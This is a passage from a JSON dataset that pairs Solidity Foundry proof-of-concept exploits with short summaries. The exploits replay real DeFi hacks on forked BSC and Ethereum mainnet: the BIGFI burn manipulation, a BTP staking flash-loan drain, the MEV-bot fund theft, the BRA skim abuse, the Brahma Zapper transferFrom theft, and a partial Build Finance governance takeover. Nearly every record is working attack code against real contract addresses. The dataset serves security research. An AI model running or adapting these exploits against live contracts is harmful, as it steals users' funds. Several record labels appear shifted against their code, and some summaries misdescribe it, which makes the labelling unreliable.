exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNB.transfer(address(WBNB_oldBGLD), WBNB.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(oldBGLD);\n        uint[] memory values = Router.getAmountsOut(125 * 1e18, path);\n        WBNB_oldBGLD.swap(0, values[1] * 90 / 100, address(this), \"\");\n        oldBGLD.transfer(address(WBNB_oldBGLD), oldBGLD.balanceOf(address(WBNB_oldBGLD)) * 10 + 10);\n        WBNB_oldBGLD.skim(address(this));\n        WBNB_oldBGLD.sync();\n        oldBGLDToWBNB();\n        WBNB.transfer(dodo, 125 * 1e18);\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        DEBT.transfer(address(oldBGLD_DEBT), DEBT.balanceOf(address(this)));\n        (uint oldBGLDreserve, uint DEBTreserve, ) = oldBGLD_DEBT.getReserves();\n        uint amountIn = DEBT.balanceOf(address(oldBGLD_DEBT)) - DEBTreserve;\n        uint amountOut = amountIn * 9975 * oldBGLDreserve / (DEBTreserve * 10000 + amountIn * 9975);\n        oldBGLD_DEBT.swap(amountOut * 90 / 100, 0, address(this), \"\");\n        oldBGLD.transfer(address(oldBGLD_DEBT), oldBGLD.balanceOf(address(oldBGLD_DEBT)) * 10 + 10);\n        oldBGLD_DEBT.skim(address(this));\n        oldBGLD_DEBT.sync();\n        oldBGLDToDEBT();\n        uint loanAmount = 950 * 1e9;\n        DEBT.transfer(address(newBGLD_DEBT), loanAmount * 10000 / 9975 + 1000);\n    }\n\n    function oldBGLDToWBNB() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(oldBGLD);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            100 * 1e6,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function newBGLDToDEBT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(newBGLD);\n        path[1] = address(DEBT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            newBGLD.balanceOf(address(this)) * 90 / 100,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function oldBGLDToDEBT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(oldBGLD);\n        path[1] = address(DEBT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            100 * 1e6,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n    \n    function DEBTToUSDT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(DEBT);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            DEBT.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n}",
        "summary": "This code defines a contract that exploits a vulnerability in another contract to gain control of another cryptocurrency (USDT) by manipulating the values of other cryptocurrencies (WBNB, oldBGLD, newBGLD, DEBT) using flash loans and a decentralized exchange (UniSwap), and migrating tokens using a proxy contract. The code also imports other contracts and interfaces that define the necessary functions and interfaces. The `setUp()` function is used to set up a fork of the Binance Smart Chain for testing purposes. The `testExploit()` function calls several internal functions to execute the exploit and logs the final balances of the attacker's USDT and WBNB accounts.",
        "id": "ea3c317f-e46a-43aa-ad9c-3047ce7694fc",
        "api_seq": "BIGFI_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @TX\n// https://bscscan.com/tx/0x9fe19093a62a7037d04617b3ac4fbf5cb2d75d8cb6057e7e1b3c75cbbd5a5adc\n// Related Events\n// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230207---fdp---reflection-token\n// https://github.com/SunWeb3Sec/DeFiHackLabs/#20230126---tinu---reflection-token\n// https://github.com/SunWeb3Sec/DeFiHackLabs#20230210---sheep---reflection-token\n\ninterface RDeflationERC20 is IERC20 {\n    function burn(uint256 amount) external;\n}\n\ninterface ISwapFlashLoan {\n    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;\n}\n\ncontract ContractTest is Test {\n    RDeflationERC20 BIGFI = RDeflationERC20(0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA269556EdC45581F355742e46D2d722c5F3f551a);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_685_503);\n        cheats.label(address(BIGFI), \"BIGFI\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(swapFlashLoan), \"swapFlashLoan\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Pair), \"Pair\");\n    }\n\n    function testExploit() external {\n        swapFlashLoan.flashLoan(address(this), address(USDT), 200_000 * 1e18, new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n    }\n\n    function executeOperation(\n        address pool,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata params\n    ) external payable {\n        USDTToBIGFI();\n        // Calculate the number of burns\n        // beforebalanceOf(Pair) == (_rOwned(Pair) * before_tTotal / _rTotal)\n        // to reduce the balanceOf(Pair) to 1 , the amount of _tTotal to burn = _tTotal - (_rTotal / _rOwned(Pair)) = _tTotal - (before_tTotal / beforebalanceOf(Pair))\n        uint256 burnAmount = BIGFI.totalSupply() - 2 * (BIGFI.totalSupply() / BIGFI.balanceOf(address(Pair)));\n        BIGFI.burn(burnAmount);\n        Pair.sync();\n        BIGFIToUSDT();\n\n        USDT.transfer(address(swapFlashLoan), amount + fee);\n    }\n\n    function USDTToBIGFI() internal {\n        USDT.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(BIGFI);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n\n    function BIGFIToUSDT() internal {\n        BIGFI.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(BIGFI);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            BIGFI.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n}\n",
        "summary": "This Solidity code defines a smart contract that allows an attacker to perform a flash loan exploit on a DeFi protocol. The `ContractTest` contract imports other contracts (`interface.sol`, `Test.sol`) and sets up interfaces with several ERC20 tokens (`RDeflationERC20`, `IERC20`) as well as a flash loan contract (`ISwapFlashLoan`), a Uniswap router contract (`Uni_Router_V2`), and a Uniswap pair contract (`Uni_Pair_V2`). The `setUp()` function sets up test data by labeling various contract addresses. The `testExploit()` function performs the flash loan exploit by calling the `swapFlashLoan.flashLoan()` function on the `ISwapFlashLoan` contract, passing the address of the current contract instance as the `receiver` parameter, and supplying some USDT tokens as collateral. The `executeOperation()` function is called as part of the flash loan process, and it converts some USDT tokens into BIGFI tokens, performs some calculations to determine how many BIGFI tokens to burn, and then converts the remaining BIGFI tokens back into USDT tokens. The `USDTToBIGFI()` and `BIGFIToUSDT()` functions handle the token swap operations. The `emit log_named_decimal_uint()` function logs information about the attacker's USDT balance after the exploit.",
        "id": "fb5bde47-b6ef-401e-90bc-78bd600847f6",
        "api_seq": "Bitpaidio_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~30K US$\n// Attacker : https://bscscan.com/address/0x878a36edfb757e8640ff78b612f839b63adc2e51\n// Attack Contract : https://bscscan.com/address/0x7b9265c6aa4b026b7220eee2e8697bf5ffa6bb9a\n// Vulnerable Contract : https://bscscan.com/address/0x9d6d817ea5d4a69ff4c4509bea8f9b2534cec108\n// Attack Tx : https://bscscan.com/tx/0x1ae499ccf292a2ee5e550702b81a4a7f65cd03af2c604e2d401d52786f459ba6\n\n// @Info\n// Vulnerable Contract Code : https://bscscan.com/address/0x9d6d817ea5d4a69ff4c4509bea8f9b2534cec108#code\n\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://twitter.com/BlockSecTeam/status/1657411284076478465\n// Hacking God : https://www.google.com/\n\ninterface IStaking {\n    function Lock_Token(uint256 plan, uint256 _amount) external;\n    function withdraw(uint256 _plan) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 BTP = IERC20(0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019);\n    IStaking Staking = IStaking(0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x858DE6F832c9b92E2EA5C18582551ccd6add0295);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    uint256 flashAmount = 219_349 * 1e18;\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_176_675);\n    }\n\n    function testExploit() public {\n        firstLock();\n\n        cheats.warp(block.timestamp + 6 * 30 * 24 * 60 * 60 + 1000); // lock 6 month\n\n        Pair.swap(flashAmount, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker BTP balance after exploit\", BTP.balanceOf(address(this)), BTP.decimals());\n    }\n\n    function firstLock() internal {\n        Staking.Lock_Token(1, 0);\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BTP.approve(address(Staking), type(uint256).max);\n        Staking.Lock_Token(1, BTP.balanceOf(address(this)));\n        Staking.withdraw(1);\n        BTP.transfer(msg.sender, flashAmount * 10_000 / 9975 + 1000);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that contains a test function called `testExploit()`. The function uses an imported interface called `IStaking` to interact with a vulnerable contract at address `0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108` on the Binance Smart Chain. The contract uses the `Lock_Token()` function to lock BTP tokens, then uses the `withdraw()` function to retrieve them. In the `testExploit()` function, the contract makes a call to `firstLock()`, then uses another imported interface called `Uni_Pair_V2` to call `swap()` and cause the vulnerable contract to transfer BTP tokens to the contract. Once the tokens have been transferred, the contract emits an event logging the balance of BTP tokens held by the contract.",
        "id": "da0b1dc1-7e8a-4f73-ac76-220a9b2c28ca",
        "api_seq": "BNB48MEVBot_exp"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface MEVBot{\n    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;\n}\n\ncontract ContractTest is DSTest{\n    address public _token0;\n    address public _token1;\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);\n    MEVBot Bot = MEVBot(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21297409);\n    }\n\n    function testExploit() public{\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n        emit log_named_decimal_uint(\n            \"[Start] Attacker WBNB balance before exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n        emit log_named_decimal_uint(\n            \"[Start] Attacker BUSD balance before exploit\",\n            BUSD.balanceOf(address(this)),\n            18\n        );\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDC balance before exploit\",\n            USDC.balanceOf(address(this)),\n            18\n        );\n\n        uint256 USDTAmount = USDT.balanceOf(address(Bot));\n        uint256 WBNBAmount = WBNB.balanceOf(address(Bot));\n        uint256 BUSDAmount = BUSD.balanceOf(address(Bot));\n        uint256 USDCAmount = USDC.balanceOf(address(Bot));\n        \n        (_token0, _token1) = (address(USDT), address(USDT));\n        Bot.pancakeCall(address(this), USDTAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0)));\n        (_token0, _token1) = (address(WBNB), address(WBNB));\n        Bot.pancakeCall(address(this), WBNBAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0)));\n        (_token0, _token1) = (address(BUSD), address(BUSD));\n        Bot.pancakeCall(address(this), BUSDAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0)));\n        (_token0, _token1) = (address(USDC), address(USDC));\n        Bot.pancakeCall(address(this), USDCAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0)));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker BUSD balance after exploit\",\n            BUSD.balanceOf(address(this)),\n            18\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\",\n            USDC.balanceOf(address(this)),\n            18\n        );\n    }\n\n     function token0() public view returns(address){ \n        return _token0;\n    }\n   \n    function token1() public view returns(address){ \n        return _token1;\n    }\n    \n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) public {}\n}",
        "summary": "This code defines a Solidity smart contract that is used to execute a specific exploit on a cryptocurrency exchange. It imports two other Solidity files and declares interfaces to interact with the contract's dependencies. The contract defines a \"setUp\" function and a \"testExploit\" function, the latter being the main function of the contract that executes the exploit. The \"testExploit\" function executes multiple transactions to swap different amounts of cryptocurrency tokens using the PancakeSwap protocol, and it logs information about the balances of these tokens before and after the transactions are executed.",
        "id": "35d900a8-d5e9-47e3-bc85-84e058c4a598",
        "api_seq": "BRA.exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : 819 BNB (~224K US$)\n// Attacker : 0x67a909f2953fb1138bea4b60894b51291d2d0795\n// Vulnerable Contract : 0x449fea37d339a11efe1b181e5d5462464bba3752\n\n// @Info\n// Attack Contract :\n//  0x1fae46b350c4a5f5c397dbf25ad042d3b9a5cb07\n//  0x6066435edce9c2772f3f1184b33fc5f7826d03e7\n// Attack Txs : \n//  0x6759db55a4edec4f6bedb5691fc42cf024be3a1a534ddcc7edd471ef205d4047 (profit 675 WBNB)\n//  0x4e5b2efa90c62f2b62925ebd7c10c953dc73c710ef06695eac3f36fe0f6b9348 (profit 144 WBNB)\n// Vulnerable Contract Code :\n//  https://bscscan.com/address/0x449fea37d339a11efe1b181e5d5462464bba3752#code#L449-L457\n\n// @Analysis\n// Blocksec : https://twitter.com/BlockSecTeam/status/1612701106982862849\n\n// Root cause : Business Logic Flaw\n//  The BRA Token contract implements a tax logic in the _transfer() function.\n//  When the sender/recipient is LP Pair, it will charge a double tax fee to LP Pair, but without called sync() functions.\n//  That allows attackers to call the skim() function to collect all imbalanced amounts.\n// Potential mitigations: Implements sync() function in _transfer()\n\ncontract Attacker is Test {\n    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Exploit immutable exploit;\n    constructor() {\n        vm.createSelectFork(\"bsc\", 24655771);\n        exploit = new Exploit();\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"[Before Attacks] Attacker WBNB balance\", wbnb.balanceOf(address(this)), 18);\n        exploit.go();\n        emit log_named_decimal_uint(\"[After Attacks] Attacker WBNB balance\", wbnb.balanceOf(address(this)), 18);\n\n    }\n}\n\ncontract Exploit is Test {\n    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);\n    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IUSDT constant usdt = IUSDT(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 constant bra = IERC20(0x449FEA37d339a11EfE1B181e5D5462464bBa3752);\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n\n    address BRA_USDT_Pair = 0x8F4BA1832611f0c364dE7114bbff92ba676AdF0E;\n\n\n    function go() public {\n        console.log(\"Step1. Flashloan 1400 WBNB from DODO\");\n        uint256 baseAmount = 1400 * 1e18;\n        address assetTo = address(this);\n        bytes memory data = \"xxas\";\n        dppAdvanced.flashLoan(baseAmount, 0, assetTo, data);\n\n        console.log(\"Step3. Send back the profit to attacker\");\n        uint256 profit = wbnb.balanceOf(address(this));\n        require(wbnb.transfer(msg.sender, profit), \"transfer failed\");\n    }\n\n    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes memory) external {\n        console.log(\"Step2. Flashloan attacks\");\n\n        address[] memory swapPath = new address[](3);\n\n        console.log(\"Unwrapping WBNB to BNB\");\n        wbnb.withdraw(baseAmount);\n\n        console.log(\"Sell 1000 BNB to BRA\");\n        swapPath[0] = address(wbnb);\n        swapPath[1] = address(usdt);\n        swapPath[2] = address(bra);\n        pancakeRouter.swapExactETHForTokens{value: 1000 ether}(1, swapPath, address(this), block.timestamp);\n\n        uint256 pairBalanceBefore = bra.balanceOf(BRA_USDT_Pair);\n        uint256 sendAmount = bra.balanceOf(address(this));\n\n        console.log(\"Init Exploit: transfer all BRA to Pair for earning double reward\");\n        emit log_named_decimal_uint(\"[Before Exp] Pair contract BRA balance\", pairBalanceBefore, 18);\n        emit log_named_decimal_uint(\"[Before Exp] Exploit contract BRA balance\", sendAmount, 18);\n        bra.transfer(BRA_USDT_Pair, sendAmount);\n\n        console.log(\"Start Exploit: skim() to earn\");\n        for(uint i; i < 101; ++i) {\n            IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);\n        }\n\n        uint256 pairBalanceAfter = bra.balanceOf(BRA_USDT_Pair);\n        emit log_named_decimal_uint(\"[After Exp] Pair contract BRA balance\", pairBalanceAfter, 18);\n\n\n        console.log(\"Swap BRA (profit) to USDT\");\n        address[] memory inputSwapPath = new address[](2);\n        uint256[] memory outputSwapAmounts = new uint256[](2);\n        inputSwapPath[0] = address(bra);\n        inputSwapPath[1] = address(usdt);\n        outputSwapAmounts = pancakeRouter.getAmountsOut(pairBalanceAfter - pairBalanceBefore, inputSwapPath); // get how much USDT the attacker can swap\n        uint256 usdtAmount = outputSwapAmounts[1];\n        IPancakePair(BRA_USDT_Pair).swap(0, usdtAmount, address(this), \"\"); // swap BRA (profit) to USDT\n\n        console.log(\"Swap USDT to WBNB\");\n        usdt.approve(address(pancakeRouter), type(uint256).max);\n        inputSwapPath[0] = address(usdt);\n        inputSwapPath[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForETH(usdtAmount, 1, inputSwapPath, address(this), block.timestamp);\n\n        //Check the attacks result is positive profit, otherwise revert the transaction.\n        assert(address(this).balance >= baseAmount);\n\n        console.log(\"Wrapping BNB to WBNB\");\n        wbnb.deposit{value: address(this).balance}();\n\n        console.log(\"Payback the flashloan to DODO\");\n        require(wbnb.transfer(msg.sender, baseAmount), \"transfer failed\");\n    }\n\n    receive() external payable {}\n}\n\n/*---------- Interface ----------*/\ninterface IDPPAdvanced {\n    event DODOFlashLoan(address borrower, address assetTo, uint256 baseAmount, uint256 quoteAmount);\n    event DODOSwap(\n        address fromToken, address toToken, uint256 fromAmount, uint256 toAmount, address trader, address receiver\n    );\n    event LpFeeRateChange(uint256 newLpFeeRate);\n    event OwnershipTransferPrepared(address indexed previousOwner, address indexed newOwner);\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    event RChange(uint8 newRState);\n\n    struct PMMState {\n        uint256 i;\n        uint256 K;\n        uint256 B;\n        uint256 Q;\n        uint256 B0;\n        uint256 Q0;\n        uint8 R;\n    }\n\n    function _BASE_PRICE_CUMULATIVE_LAST_() external view returns (uint256);\n    function _BASE_RESERVE_() external view returns (uint112);\n    function _BASE_TARGET_() external view returns (uint112);\n    function _BASE_TOKEN_() external view returns (address);\n    function _BLOCK_TIMESTAMP_LAST_() external view returns (uint32);\n    function _IS_OPEN_TWAP_() external view returns (bool);\n    function _I_() external view returns (uint128);\n    function _K_() external view returns (uint64);\n    function _LP_FEE_RATE_() external view returns (uint64);\n    function _MAINTAINER_() external view returns (address);\n    function _MT_FEE_RATE_MODEL_() external view returns (address);\n    function _NEW_OWNER_() external view returns (address);\n    function _OWNER_() external view returns (address);\n    function _QUOTE_RESERVE_() external view returns (uint112);\n    function _QUOTE_TARGET_() external view returns (uint112);\n    function _QUOTE_TOKEN_() external view returns (address);\n    function _RState_() external view returns (uint32);\n    function claimOwnership() external;\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;\n    function getBaseInput() external view returns (uint256 input);\n    function getMidPrice() external view returns (uint256 midPrice);\n    function getPMMState() external view returns (PMMState memory state);\n    function getPMMStateForCall()\n        external\n        view\n        returns (uint256 i, uint256 K, uint256 B, uint256 Q, uint256 B0, uint256 Q0, uint256 R);\n    function getQuoteInput() external view returns (uint256 input);\n    function getUserFeeRate(address user) external view returns (uint256 lpFeeRate, uint256 mtFeeRate);\n    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);\n    function init(\n        address owner,\n        address maintainer,\n        address baseTokenAddress,\n        address quoteTokenAddress,\n        uint256 lpFeeRate,\n        address mtFeeRateModel,\n        uint256 k,\n        uint256 i,\n        bool isOpenTWAP\n    ) external;\n    function initOwner(address newOwner) external;\n    function querySellBase(address trader, uint256 payBaseAmount)\n        external\n        view\n        returns (uint256 receiveQuoteAmount, uint256 mtFee, uint8 newRState, uint256 newBaseTarget);\n    function querySellQuote(address trader, uint256 payQuoteAmount)\n        external\n        view\n        returns (uint256 receiveBaseAmount, uint256 mtFee, uint8 newRState, uint256 newQuoteTarget);\n    function ratioSync() external;\n    function reset(\n        address assetTo,\n        uint256 newLpFeeRate,\n        uint256 newI,\n        uint256 newK,\n        uint256 baseOutAmount,\n        uint256 quoteOutAmount,\n        uint256 minBaseReserve,\n        uint256 minQuoteReserve\n    ) external returns (bool);\n    function retrieve(address to, address token, uint256 amount) external;\n    function sellBase(address to) external returns (uint256 receiveQuoteAmount);\n    function sellQuote(address to) external returns (uint256 receiveBaseAmount);\n    function transferOwnership(address newOwner) external;\n    function tuneParameters(\n        uint256 newLpFeeRate,\n        uint256 newI,\n        uint256 newK,\n        uint256 minBaseReserve,\n        uint256 minQuoteReserve\n    ) external returns (bool);\n    function tunePrice(uint256 newI, uint256 minBaseReserve, uint256 minQuoteReserve) external returns (bool);\n    function version() external pure returns (string memory);\n} \n",
        "summary": "This code contains the contracts for a blockchain smart contract exploit on the Binance Smart Chain (BSC). The \"Attacker\" contract initiates the exploit by calling the \"Exploit\" contract. The exploit involves using a flash loan to manipulate the price of a token and transfer funds to the attacker. The exploit takes advantage of a business logic flaw in the BRA Token contract, which allows the attacker to collect all imbalanced amounts. The code also includes several interfaces for accessing data and functions on the BSC.",
        "id": "fd538511-03f5-450b-bf09-6c21d1312c1c",
        "api_seq": "BrahTOPG_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// attacker tx: https://etherscan.io/tx/0xeaef2831d4d6bca04e4e9035613be637ae3b0034977673c1c2f10903926f29c0\n// offcial post-mortem: https://medium.com/neptune-mutual/decoding-brahma-brahtopg-smart-contract-vulnerability-7b7c364b79d8\n\ninterface Zapper {\n    struct ZapData {\n        address requiredToken;\n        uint256 amountIn;\n        uint256 minAmountOut;\n        address allowanceTarget;\n        address swapTarget;\n        bytes callData;\n    }\n    function zapIn(ZapData calldata zapCall) external;\n}\n\ncontract ContractTest is DSTest{\n    Zapper zappper = Zapper(0xD248B30A3207A766d318C7A87F5Cf334A439446D);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);\n    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    address victimAddress = 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15933794);\n    }\n\n    function testExploit() public{\n        address(WETH).call{value: 1e15}(\"\");\n        WETHToFRAX();\n        uint balance = USDC.balanceOf(victimAddress);\n        uint allowance = USDC.allowance(victimAddress, address(zappper));\n        uint amount = balance;\n        if(balance > allowance){\n            amount = allowance;\n        }\n        bytes memory data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victimAddress, address(this), amount);\n        Zapper.ZapData memory zapData = Zapper.ZapData({\n            requiredToken: address(this),\n            amountIn: 1,\n            minAmountOut: 0,\n            allowanceTarget: address(this),\n            swapTarget: address(USDC),\n            callData: data\n\n        });\n        zappper.zapIn(zapData);\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\",\n            USDC.balanceOf(address(this)),\n            6\n        );\n    }\n\n    function WETHToFRAX() internal{\n        WETH.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(FRAX);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WETH.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        return true;\n    }\n\n    function balanceOf(address account) external view returns (uint) {\n        return 1;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n       FRAX.transfer(address(zappper), 10);\n        return true;\n    }\n\n}\n",
        "summary": "This is a Solidity smart contract that includes an interface to interact with a separate Zapper contract. The contract defines several ERC20 tokens including WETH, USDC, and FRAX. The main function of the contract is to exploit a vulnerability in the Brahma Smart Contract and transfer USDC tokens to the attacker's account. The contract invokes the `ZapIn` function of the Zapper contract using data containing the transfer request information. Finally, the contract has three functions: `transferFrom`, `balanceOf`, and `approve`.",
        "id": "c2aec251-0c75-409f-93fd-8e90cdd9f18b",
        "api_seq": "BuildF_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IBuildFinance BuildGovernance =\n  IBuildFinance(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583);\n  IERC20 build = IERC20(0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739);\n\n  function setUp() public {\n    cheat.createSelectFork(\"mainnet\", 14235712); // fork mainnet at block 14235712\n  }\n\n  function test() public {\n    cheat.prank(0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1);\n    build.transfer(address(this), 101529401443281484977);\n    emit log_named_uint(\n      \"Befre proposing, BUILD balance of attacker:\",\n      build.balanceOf(address(this))\n    );\n    build.approve(address(BuildGovernance), type(uint256).max);\n\n    BuildGovernance.propose(\n      0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739,\n      0,\n      hex\"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"\n    );\n    emit log_named_uint(\n      \"After proposing, BUILD balance of attacker:\",\n      build.balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"BUILD balance of BuildGovernance contract:\",\n      build.balanceOf(address(BuildGovernance))\n    );\n    cheat.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);\n    build.approve(address(BuildGovernance), type(uint256).max);\n    cheat.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);\n    BuildGovernance.vote(8, true);\n    emit log_named_int(\"Proposal count:\", BuildGovernance.proposalCount());\n    emit log_named_uint(\"Proposal state:\", BuildGovernance.state(8));\n\n    cheat.warp(1655436437);\n    emit log_named_uint(\n      \"After 2 days, Proposal state:\",\n      BuildGovernance.state(8)\n    );\n    BuildGovernance.execute(\n      8,\n      0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739,\n      0,\n      